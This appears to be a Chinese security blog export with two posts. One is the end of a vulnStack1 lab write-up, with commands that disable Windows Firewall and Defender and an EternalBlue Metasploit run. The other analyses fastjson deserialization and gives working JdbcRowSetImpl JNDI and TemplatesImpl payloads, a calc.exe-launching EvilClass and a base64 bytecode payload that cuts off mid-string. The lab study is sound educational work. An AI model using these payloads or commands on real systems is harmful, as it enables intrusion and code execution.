<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424221152505.png" alt="image-20230424221152505"></p>
<p>2，利于该漏洞拿下域控</p>
<p>关闭跳板机防火墙：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sessions -l #查看所有会话</span><br><span class="line">sessions 4  #进入会话4中</span><br><span class="line">netsh advfirewall set allprofiles state off #关闭防火墙</span><br><span class="line">net stop windefend #关闭Windows defender</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425210633606.png" alt="image-20230425210633606"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230424221724928.png" alt="image-20230424221724928"></p>
<p>报错，并没有把域控打蓝屏，也没有拿到shell。</p>
<p>根据报错，搜了下并没有解决问题，后面打开的时候莫名奇妙域环境中端口也不通了。暂时先了解下流程，后面多学点再来试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425223010635.png" alt="image-20230425223010635"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230425223036044.png" alt="image-20230425223036044"></p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1，如何判断是否存在域环境</p>
<ul>
<li>net config Workstation ：查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息</li>
<li>ipconfig /all ：查看 DNS 服务器，发现主 DNS 后缀不为空，存在域<code>god.org</code></li>
</ul>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>计网知识掌握太少，对于一些操作为什么要去这样做不是很理解</li>
<li>域相关知识不了解</li>
</ul>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><ul>
<li><a target="_blank" rel="noopener" href="https://jwt1399.top/posts/24047.html#toc-heading-2">CS</a></li>
<li>MSF</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/php09/p/10530057.html">nmap</a></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/11835388">https://blog.csdn.net/weixin_39190897/article/details/11835388</a></li>
<li><a target="_blank" rel="noopener" href="https://jwt1399.top/posts/24047.html">https://jwt1399.top/posts/24047.html</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/" data-id="clgwd8opq0000y4uqda0j4nin" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-fastjson漏洞分析-1224-68" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/" class="article-date">
  <time datetime="2023-04-16T19:12:04.000Z" itemprop="datePublished">2023-04-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/">fastjson漏洞分析-1224-68</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>##简介</p>
<p>​    fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁</p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li><p>不需要实现<code>Serializable</code>接口</p>
</li>
<li><p>变量不需要不是<code>transient</code>，变量有对应的<code>setter</code>或者是<code>public</code>或者满足条件的<code>getter</code></p>
</li>
<li><p>sink 反射，动态类加载</p>
</li>
<li><p>版本限制，依赖限制，出网</p>
</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>JSON.toJSONString()，JSON.toJSONString(Object, SerializerFeature.WriteClassName);</strong></p>
<p>将对象转换为<code>json</code>格式的字符串。</p>
<ul>
<li>JSON.toJSONString()：普通转换</li>
<li>JSON.toJSONString(Object, SerializerFeature.WriteClassName)：其会<strong>将对象类型一起序列化并且会写入到<code>@type</code>字段中</strong></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230412204321465.png" alt="image-20230412204321465"></p>
<p><strong>JSON.parse()，JSON.parseObject() , JSON.parseObject(Srting,Class)</strong></p>
<p>将json格式的字符串转换为对象。</p>
<ul>
<li><code>parse</code>会转换为<code>@type</code>指定的类，用<code>parse</code>反序列化时，调用<code>set</code>方法</li>
<li><code>parseObject</code>会默认指定<code>JSONObject</code>类，<code>parseObject</code>反序列化时，调用了<code>@type</code>指定类的set和get方法</li>
<li><code> parseObject(Srting,Class)</code>参数中加一个类参数则会转换为其指定的类（这里指定Object会自动转化为JSONObject）,<code>parseObject(Srting,Class)</code>反序列化时，调用了<code>@type</code>指定类的set方法</li>
</ul>
<p><strong>简单分析下demo</strong></p>
<p>这里直接搬用了<a target="_blank" rel="noopener" href="https://tttang.com/user/Da22le">Da22le</a>师傅的测试用例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="string">&quot;game&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line"></span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        System.out.println(s2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s2);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">        System.out.println(parse.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parseObject(s2);</span><br><span class="line">        System.out.println(parse1);</span><br><span class="line">        System.out.println(parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse2</span> <span class="operator">=</span> JSON.parseObject(s2,Object.class);</span><br><span class="line">        System.out.println(parse2);</span><br><span class="line">        System.out.println(parse2.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age, String hobby)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHobby</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobby</span><span class="params">(String hobby)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413103719561.png" alt="image-20230413103719561"></p>
<p>调用set方法：（具体调用流程看调用栈）</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413104435731.png" alt="image-20230413104435731"></p>
<p>调用get方法：</p>
<p>在<code>paseObject</code>中会调用<code>toJSON</code>方法，其中toJSON里调用了<code>get</code>方法，具体看调用栈</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413105126432.png" alt="image-20230413105126432"></p>
<p><strong>@type作用？</strong></p>
<p>在<code>com\alibaba\fastjson\parser\DefaultJSONParser.class</code>中，获取到标识符<code>@type</code>赋给<code>key</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413114756649.png" alt="image-20230413114756649"></p>
<p>判断key是否是<code>@type</code>，<code>JSON.DEFAULT_TYPE_KEY</code>就是常量<code>@type</code>。接着在获取<code>paylaod</code>中引号包裹的下一位，即是<code>@type</code>后面跟着的字符串 - 指定加载的类 </p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413202831970.png" alt="image-20230413202831970"></p>
<h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><p><code>pom.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>漏洞利用：</p>
<ul>
<li><p>JdbcRowSetImpl</p>
</li>
<li><p>TemplatesImpl</p>
</li>
</ul>
<p>fastjon中存在两条利用链</p>
<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>在<code>JdbcRowSetImpl#setAutoCommit</code>中，<code>setAutoCommit</code>方法里调用了<code>connect()</code>方法，而在<code>connect</code>方法中可以调用lookup方法，即存在jndi注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl#setAutoCommit -&gt; connect -&gt; lookup</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413223739395.png" alt="image-20230413223739395"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230413211802540.png" alt="image-20230413211802540"></p>
<p><code>JdbcRowSetImpl</code>利用链测试<code>demo</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lookupDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1389/mymwv2&quot;</span>);</span><br><span class="line">        jdbcRowSet.setAutoCommit(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>paylaod：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parse(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ckb7j7\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>###TemplatesImpl</p>
<p>fastjosn存在下例特性：</p>
<ul>
<li><p>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</p>
</li>
<li><p>fastjson 在为类属性寻找getter/setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_ -</code>字符串</p>
</li>
<li><p>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</p>
</li>
</ul>
<p>先来看一下<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法，它是<code>_outputProperties</code>的getter方法，</p>
<p><code>getOutputProperties</code>中调用了<code>newTransformer</code>方法，跟进，跟进该方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230414143957996.png" alt="image-20230414143957996"></p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230414144205877.png" alt="image-20230414144205877"></p>
<p>new<code>TransformerImpl</code>对象时会进入到<code>getTransletInstance()</code>中，在<code>getTransletInstance</code>方法中判断了<code>_name</code>和<code>_class</code>是否为空，如果<code>_name!=null</code>&amp;&amp;<code>_class=null</code>则会调用到<code>defineTransletClasses()</code>。在<code>defineTransletClasses()</code>中，通过for循环加载<code>_bytecodes[]</code>来加载类，其中<code>_tfactory</code>不为null，并且因为加载完类后会强制类型转换为<code>AbstractTranslet</code>，也就是说加载的类必须为<code>AbstractTranslet</code>的子类。</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230414144902921.png" alt="image-20230414144902921"></p>
<p>接下来会实例化<code>_class[_transletIndex]</code>并强制转为<code>AbstractTranslet</code>类型，其中<code>_transletIndex=-1</code>即实例化数组<code>_class</code>的第一位</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230414144426335.png" alt="image-20230414144426335"></p>
<p>还有一点就是，利用到的所有变量都为<code>private</code>,在反序列化的时候需要加上<code>Feature.SupportNonPublicField</code>参数</p>
<p>到这里就找到了整条利用链，总结下条件：</p>
<ul>
<li>fastjson反序列化时需有<code>Feature.SupportNonPublicField</code>参数  </li>
<li><code>_bytecodes[]</code>需进行base64编码</li>
<li><code>_bytecodes[]</code>中加载的类需为<code>AbstractTranslet</code>的子类</li>
<li><code>_name != null</code></li>
<li><code>_tfactory != null</code></li>
</ul>
<p>测试：恶意类<code>EvilClass</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>base64编码后<code>json.prase</code>解析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;E:\\java_file\\JNDI\\Fastjson\\src\\main\\java\\com\\example\\fastjson\\EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = fis.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytecode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;%s\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>,bytecode);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEAHmNvbS9leGFtcGxlL2Zhc3Rqc29uL0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAANAA